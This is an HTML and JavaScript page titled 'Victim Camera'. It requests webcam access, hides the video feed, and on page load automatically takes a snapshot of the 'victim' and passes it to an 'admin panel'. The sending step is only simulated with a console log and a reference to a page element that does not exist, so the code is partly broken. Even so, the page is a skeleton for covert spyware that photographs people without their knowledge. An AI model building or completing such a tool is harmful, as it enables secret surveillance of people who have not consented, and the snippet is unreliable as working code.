<!DOCTYPE html>
<html>
<head>
    <title>Victim Camera</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f5f5f5;
        }
        .hidden-camera {
            display: none;
        }
        #camera-container {
            text-align: center;
        }
        #victim-camera {
            width: 100%;
            max-width: 400px;
            height: 300px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        #take-photo-btn {
            margin: 10px;
            padding: 10px 20px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #take-photo-btn:hover {
            background: #0056b3;
        }
        #photos-container {
            margin-top: 20px;
            text-align: center;
        }
        .photo-item {
            margin: 10px;
            display: inline-block;
        }
        .photo-item img {
            width: 150px;
            height: 150px;
            object-fit: cover;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .status-indicator {
            color: green;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .admin-control {
            background: #f0f8ff;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .victim-only {
            display: none;
        }
    </style>
</head>
<body>
    <h2>Victim Camera</h2>
    <div class="status-indicator">Camera Active ✓</div>

    <!-- Hidden camera for taking photos -->
    <div id="camera-container" class="hidden-camera">
        <video id="victim-camera" autoplay muted></video>
        <br>
        <button id="take-photo-btn">Take Photo</button>
    </div>

    <div id="photos-container">
        <h3>Photos Taken:</h3>
    </div>

    <script>
        let video = document.getElementById('victim-camera');
        let canvas = document.createElement('canvas');
        let photosContainer = document.getElementById('photos-container');

        // Get camera access
        navigator.mediaDevices.getUserMedia({video: true})
            .then(stream => {
                video.srcObject = stream;
                console.log('Camera access granted');
            })
            .catch(err => {
                console.error('Camera access denied:', err);
                document.querySelector('.status-indicator').textContent = 'Camera Error ✗';
            });

        // Take photo function
        document.getElementById('take-photo-btn').addEventListener('click', () => {
            try {
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Draw video frame to canvas
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert to data URL
                const imageData = canvas.toDataURL('image/jpeg');

                // Create photo element
                const photoDiv = document.createElement('div');
                photoDiv.className = 'photo-item';
                photoDiv.innerHTML = `
                    <img src="${imageData}" alt="Victim Photo">
                    <p>${new Date().toLocaleTimeString()}</p>
                `;

                // Add to container
                photosContainer.appendChild(photoDiv);

                // Send to admin panel
                sendPhotoToAdmin(imageData);

            } catch (error) {
                console.error('Error taking photo:', error);
            }
        });

        // Send photo to admin panel
        function sendPhotoToAdmin(imageData) {
            // Simulate sending to admin (in real app, use WebSocket or AJAX)
            console.log('Photo sent to admin panel');

            // For demo purposes, we'll also show it in admin panel
            const adminPhotos = document.getElementById('admin-photos');
            const photoDiv = document.createElement('div');
            photoDiv.className = 'photo-item';
            photoDiv.innerHTML = `
                <img src="${imageData}" alt="Victim Photo">
                <p>From Victim - ${new Date().toLocaleTimeString()}</p>
            `;
            adminPhotos.appendChild(photoDiv);
        }

        // Auto-trigger photo taking when page loads
        window.addEventListener('load', () => {
            // Simulate admin triggering photo
            setTimeout(() => {
                // Take photo automatically
                try {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg');
                    sendPhotoToAdmin(imageData);
                } catch (error) {
                    console.error('Auto photo error:', error);
                }
            }, 1000);
        });
    </script>
</body>
</html>
